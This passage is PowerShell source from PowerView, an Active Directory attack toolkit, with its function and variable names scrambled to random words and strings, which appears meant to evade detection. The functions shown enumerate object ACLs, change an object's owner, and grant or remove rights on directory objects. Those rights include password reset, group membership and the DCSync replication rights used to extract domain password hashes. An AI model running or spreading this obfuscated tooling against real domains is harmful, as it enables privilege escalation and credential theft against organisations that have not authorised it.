        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $EqtQumnS99,
        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $EmJneKCO99,
        [Guid]
        $BmUdKOco99
    )
    Begin {
        if ($YbgFSwLK99 -notmatch '^S-1-.*') {
            $DbdVfuZO99 = @{
                'Identity' = $YbgFSwLK99
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $DbdVfuZO99['Domain'] = $YMcEuqkF99 }
            if ($PSBoundParameters['Server']) { $DbdVfuZO99['Server'] = $YdBDxrjg99 }
            if ($PSBoundParameters['SearchScope']) { $DbdVfuZO99['SearchScope'] = $eLpWCwqM99 }
            if ($PSBoundParameters['ResultPageSize']) { $DbdVfuZO99['ResultPageSize'] = $xRYvUWYi99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $DbdVfuZO99['ServerTimeLimit'] = $vqNdfRPs99 }
            if ($PSBoundParameters['Tombstone']) { $DbdVfuZO99['Tombstone'] = $CnaAXLuN99 }
            if ($PSBoundParameters['Credential']) { $DbdVfuZO99['Credential'] = $DOZPHpup99 }
            $vZqcJCYL99 = cupped @PrincipalSearcherArguments
            if (-not $vZqcJCYL99) {
                throw "Unable to resolve principal: $YbgFSwLK99"
            }
            elseif($vZqcJCYL99.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $aDsLribc99 = $vZqcJCYL99.objectsid
        }
        else {
            $aDsLribc99 = $YbgFSwLK99
        }
        $ofSUmXOd99 = 0
        foreach($r in $Right) {
            $ofSUmXOd99 = $ofSUmXOd99 -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $ofSUmXOd99 = [System.DirectoryServices.ActiveDirectoryRights]$ofSUmXOd99
        $fqOhNdkk99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$aDsLribc99)
    }
    Process {
        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {
            if($EqtQumnS99 -eq $null -and $EmJneKCO99 -eq [String]::Empty -and $BmUdKOco99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $fqOhNdkk99, $ofSUmXOd99, $CWZFxPIE99
            } elseif($EqtQumnS99 -eq $null -and $EmJneKCO99 -ne [String]::Empty -and $BmUdKOco99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $fqOhNdkk99, $ofSUmXOd99, $CWZFxPIE99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$EmJneKCO99)
            } elseif($EqtQumnS99 -eq $null -and $EmJneKCO99 -ne [String]::Empty -and $BmUdKOco99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $fqOhNdkk99, $ofSUmXOd99, $CWZFxPIE99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$EmJneKCO99), $BmUdKOco99
            } elseif($EqtQumnS99 -ne $null -and $EmJneKCO99 -eq [String]::Empty -and $BmUdKOco99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $fqOhNdkk99, $ofSUmXOd99, $CWZFxPIE99, $EqtQumnS99
            } elseif($EqtQumnS99 -ne $null -and $EmJneKCO99 -ne [String]::Empty -and $BmUdKOco99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $fqOhNdkk99, $ofSUmXOd99, $CWZFxPIE99, $EqtQumnS99, $EmJneKCO99
            } elseif($EqtQumnS99 -ne $null -and $EmJneKCO99 -ne [String]::Empty -and $BmUdKOco99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $fqOhNdkk99, $ofSUmXOd99, $CWZFxPIE99, $EqtQumnS99, $EmJneKCO99, $BmUdKOco99
            }
        }
        else {
            if($EqtQumnS99 -eq $null -and $EmJneKCO99 -eq [String]::Empty -and $BmUdKOco99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $fqOhNdkk99, $ofSUmXOd99, $izzwHBDO99
            } elseif($EqtQumnS99 -eq $null -and $EmJneKCO99 -ne [String]::Empty -and $BmUdKOco99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $fqOhNdkk99, $ofSUmXOd99, $izzwHBDO99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$EmJneKCO99)
            } elseif($EqtQumnS99 -eq $null -and $EmJneKCO99 -ne [String]::Empty -and $BmUdKOco99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $fqOhNdkk99, $ofSUmXOd99, $izzwHBDO99, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$EmJneKCO99), $BmUdKOco99
            } elseif($EqtQumnS99 -ne $null -and $EmJneKCO99 -eq [String]::Empty -and $BmUdKOco99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $fqOhNdkk99, $ofSUmXOd99, $izzwHBDO99, $EqtQumnS99
            } elseif($EqtQumnS99 -ne $null -and $EmJneKCO99 -ne [String]::Empty -and $BmUdKOco99 -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $fqOhNdkk99, $ofSUmXOd99, $izzwHBDO99, $EqtQumnS99, $EmJneKCO99
            } elseif($EqtQumnS99 -ne $null -and $EmJneKCO99 -ne [String]::Empty -and $BmUdKOco99 -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $fqOhNdkk99, $ofSUmXOd99, $izzwHBDO99, $EqtQumnS99, $EmJneKCO99, $BmUdKOco99
            }
        }
    }
}
function forensic {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $fqOhNdkk99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $BXoTYfNr99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $zLdPCUTB99 = @{}
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['LDAPFilter']) { $zLdPCUTB99['LDAPFilter'] = $gzpPmKdI99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        $MmnRwnst99 = cupped @SearcherArguments -fqOhNdkk99 $BXoTYfNr99 -PvRupVWt99 objectsid | Select-Object -ExpandProperty objectsid
        if ($MmnRwnst99) {
            $vDdDjulx99 = [System.Security.Principal.SecurityIdentifier]$MmnRwnst99
        }
        else {
            Write-Warning "[forensic] Error parsing owner identity '$BXoTYfNr99'"
        }
    }
    PROCESS {
        if ($vDdDjulx99) {
            $zLdPCUTB99['Raw'] = $True
            $zLdPCUTB99['Identity'] = $fqOhNdkk99
            $rQJIZokN99 = cupped @SearcherArguments
            ForEach ($Object in $rQJIZokN99) {
                try {
                    Write-Verbose "[forensic] Attempting to set the owner for '$fqOhNdkk99' to '$BXoTYfNr99'"
                    $Entry = $rQJIZokN99.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                    $Entry.PsBase.ObjectSecurity.SetOwner($vDdDjulx99)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[forensic] Error setting owner: $_"
                }
            }
        }
    }
}
function annihilated {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $fqOhNdkk99,
        [Switch]
        $Sacl,
        [Switch]
        $vaIHORHD99,
        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $XvtxnAdg99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $zLdPCUTB99 = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }
        if ($PSBoundParameters['Sacl']) {
            $zLdPCUTB99['SecurityMasks'] = 'Sacl'
        }
        else {
            $zLdPCUTB99['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        $sPshdNSJ99 = breading @SearcherArguments
        $WeJCYBIe99 = @{}
        if ($PSBoundParameters['Domain']) { $WeJCYBIe99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Server']) { $WeJCYBIe99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['ResultPageSize']) { $WeJCYBIe99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $WeJCYBIe99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Credential']) { $WeJCYBIe99['Credential'] = $DOZPHpup99 }
        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = obsessively @DomainGUIDMapArguments
        }
    }
    PROCESS {
        if ($sPshdNSJ99) {
            $waAVGUFD99 = ''
            $nQZyhrEp99 = ''
            $fqOhNdkk99 | Where-Object {$_} | ForEach-Object {
                $MFlrbkhb99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($MFlrbkhb99 -match '^S-1-.*') {
                    $waAVGUFD99 += "(objectsid=$MFlrbkhb99)"
                }
                elseif ($MFlrbkhb99 -match '^(CN|OU|DC)=.*') {
                    $waAVGUFD99 += "(distinguishedname=$MFlrbkhb99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $cIRoWbek99 = $MFlrbkhb99.SubString($MFlrbkhb99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[annihilated] Extracted domain '$cIRoWbek99' from '$MFlrbkhb99'"
                        $zLdPCUTB99['Domain'] = $cIRoWbek99
                        $sPshdNSJ99 = breading @SearcherArguments
                        if (-not $sPshdNSJ99) {
                            Write-Warning "[annihilated] Unable to retrieve domain searcher for '$cIRoWbek99'"
                        }
                    }
                }
                elseif ($MFlrbkhb99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $yhPDRNjn99 = (([Guid]$MFlrbkhb99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $waAVGUFD99 += "(objectguid=$yhPDRNjn99)"
                }
                elseif ($MFlrbkhb99.Contains('.')) {
                    $waAVGUFD99 += "(|(samAccountName=$MFlrbkhb99)(name=$MFlrbkhb99)(dnshostname=$MFlrbkhb99))"
                }
                else {
                    $waAVGUFD99 += "(|(samAccountName=$MFlrbkhb99)(name=$MFlrbkhb99)(displayname=$MFlrbkhb99))"
                }
            }
            if ($waAVGUFD99 -and ($waAVGUFD99.Trim() -ne '') ) {
                $nQZyhrEp99 += "(|$waAVGUFD99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[annihilated] Using additional LDAP filter: $gzpPmKdI99"
                $nQZyhrEp99 += "$gzpPmKdI99"
            }
            if ($nQZyhrEp99) {
                $sPshdNSJ99.filter = "(&$nQZyhrEp99)"
            }
            Write-Verbose "[annihilated] annihilated filter string: $($sPshdNSJ99.filter)"
            $NtqBcYnO99 = $sPshdNSJ99.FindAll()
            $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties
                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $aDsLribc99 = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $aDsLribc99 = $Null
                }
                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $tuBNfkwh99 = Switch ($XvtxnAdg99) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $tuBNfkwh99) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $aDsLribc99
                                $GhkRRrRC99 = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $aDsLribc99
                            $GhkRRrRC99 = $True
                        }
                        if ($GhkRRrRC99) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                $pRZSmIyc99 = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $pRZSmIyc99[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $pRZSmIyc99[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $pRZSmIyc99[$_.Name] = $_.Value
                                    }
                                }
                                $zcUrfYCV99 = New-Object -TypeName PSObject -Property $pRZSmIyc99
                                $zcUrfYCV99.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $zcUrfYCV99
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[annihilated] Error: $_"
                }
            }
        }
    }
}
function skydive {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $PXMOOppE99,
        [ValidateNotNullOrEmpty()]
        [String]
        $zXzbbNbr99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $GfHFYRxJ99,
        [ValidateNotNullOrEmpty()]
        [String]
        $kxsVnOEo99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $YbgFSwLK99,
        [ValidateNotNullOrEmpty()]
        [String]
        $YMcEuqkF99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $wfAdEljc99 = 'All',
        [Guid]
        $XSOwXlnW99
    )
    BEGIN {
        $aYxAklQn99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $aYxAklQn99['Domain'] = $zXzbbNbr99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $aYxAklQn99['LDAPFilter'] = $GfHFYRxJ99 }
        if ($PSBoundParameters['TargetSearchBase']) { $aYxAklQn99['SearchBase'] = $kxsVnOEo99 }
        if ($PSBoundParameters['Server']) { $aYxAklQn99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $aYxAklQn99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $aYxAklQn99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $aYxAklQn99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $aYxAklQn99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $aYxAklQn99['Credential'] = $DOZPHpup99 }
        $DbdVfuZO99 = @{
            'Identity' = $YbgFSwLK99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $DbdVfuZO99['Domain'] = $YMcEuqkF99 }
        if ($PSBoundParameters['Server']) { $DbdVfuZO99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $DbdVfuZO99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $DbdVfuZO99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $DbdVfuZO99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $DbdVfuZO99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $DbdVfuZO99['Credential'] = $DOZPHpup99 }
        $mbZNGKLC99 = cupped @PrincipalSearcherArguments
        if (-not $mbZNGKLC99) {
            throw "Unable to resolve principal: $YbgFSwLK99"
        }
    }
    PROCESS {
        $aYxAklQn99['Identity'] = $PXMOOppE99
        $UgNDqztj99 = cupped @TargetSearcherArguments
        ForEach ($hDRRLCBA99 in $UgNDqztj99) {
            $EmJneKCO99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $hDfCEhOh99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()
            if ($XSOwXlnW99) {
                $GUIDs = @($XSOwXlnW99)
            }
            else {
                $GUIDs = Switch ($wfAdEljc99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }
            ForEach ($xTrpRCSy99 in $mbZNGKLC99) {
                Write-Verbose "[skydive] Granting principal $($xTrpRCSy99.distinguishedname) '$wfAdEljc99' on $($hDRRLCBA99.Properties.distinguishedname)"
                try {
                    $fqOhNdkk99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$xTrpRCSy99.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $HmCXjvmz99 = New-Object Guid $GUID
                            $GidrbhoU99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $fqOhNdkk99, $GidrbhoU99, $hDfCEhOh99, $HmCXjvmz99, $EmJneKCO99
                        }
                    }
                    else {
                        $GidrbhoU99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $fqOhNdkk99, $GidrbhoU99, $hDfCEhOh99, $EmJneKCO99
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[skydive] Granting principal $($xTrpRCSy99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($hDRRLCBA99.Properties.distinguishedname)"
                        $izmSRkEQ99 = $hDRRLCBA99.GetDirectoryEntry()
                        $izmSRkEQ99.PsBase.Options.SecurityMasks = 'Dacl'
                        $izmSRkEQ99.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $izmSRkEQ99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[skydive] Error granting principal $($xTrpRCSy99.distinguishedname) '$wfAdEljc99' on $($hDRRLCBA99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function coordinates {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $PXMOOppE99,
        [ValidateNotNullOrEmpty()]
        [String]
        $zXzbbNbr99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $GfHFYRxJ99,
        [ValidateNotNullOrEmpty()]
        [String]
        $kxsVnOEo99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $YbgFSwLK99,
        [ValidateNotNullOrEmpty()]
        [String]
        $YMcEuqkF99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $wfAdEljc99 = 'All',
        [Guid]
        $XSOwXlnW99
    )
    BEGIN {
        $aYxAklQn99 = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $aYxAklQn99['Domain'] = $zXzbbNbr99 }
        if ($PSBoundParameters['TargetLDAPFilter']) { $aYxAklQn99['LDAPFilter'] = $GfHFYRxJ99 }
        if ($PSBoundParameters['TargetSearchBase']) { $aYxAklQn99['SearchBase'] = $kxsVnOEo99 }
        if ($PSBoundParameters['Server']) { $aYxAklQn99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $aYxAklQn99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $aYxAklQn99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $aYxAklQn99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $aYxAklQn99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $aYxAklQn99['Credential'] = $DOZPHpup99 }
        $DbdVfuZO99 = @{
            'Identity' = $YbgFSwLK99
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $DbdVfuZO99['Domain'] = $YMcEuqkF99 }
        if ($PSBoundParameters['Server']) { $DbdVfuZO99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $DbdVfuZO99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $DbdVfuZO99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $DbdVfuZO99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $DbdVfuZO99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $DbdVfuZO99['Credential'] = $DOZPHpup99 }
        $mbZNGKLC99 = cupped @PrincipalSearcherArguments
        if (-not $mbZNGKLC99) {
            throw "Unable to resolve principal: $YbgFSwLK99"
        }
    }
    PROCESS {
        $aYxAklQn99['Identity'] = $PXMOOppE99
        $UgNDqztj99 = cupped @TargetSearcherArguments
        ForEach ($hDRRLCBA99 in $UgNDqztj99) {
            $EmJneKCO99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $hDfCEhOh99 = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()
            if ($XSOwXlnW99) {
                $GUIDs = @($XSOwXlnW99)
            }
            else {
                $GUIDs = Switch ($wfAdEljc99) {
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }
            ForEach ($xTrpRCSy99 in $mbZNGKLC99) {
                Write-Verbose "[coordinates] Removing principal $($xTrpRCSy99.distinguishedname) '$wfAdEljc99' from $($hDRRLCBA99.Properties.distinguishedname)"
                try {
                    $fqOhNdkk99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$xTrpRCSy99.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $HmCXjvmz99 = New-Object Guid $GUID
                            $GidrbhoU99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $fqOhNdkk99, $GidrbhoU99, $hDfCEhOh99, $HmCXjvmz99, $EmJneKCO99
                        }
                    }
                    else {
                        $GidrbhoU99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $fqOhNdkk99, $GidrbhoU99, $hDfCEhOh99, $EmJneKCO99
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[coordinates] Granting principal $($xTrpRCSy99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($hDRRLCBA99.Properties.distinguishedname)"
                        $izmSRkEQ99 = $hDRRLCBA99.GetDirectoryEntry()
                        $izmSRkEQ99.PsBase.Options.SecurityMasks = 'Dacl'
                        $izmSRkEQ99.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $izmSRkEQ99.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[coordinates] Error removing principal $($xTrpRCSy99.distinguishedname) '$wfAdEljc99' from $($hDRRLCBA99.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function Gruyeres {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $jeGdZvYa99,
        [Switch]
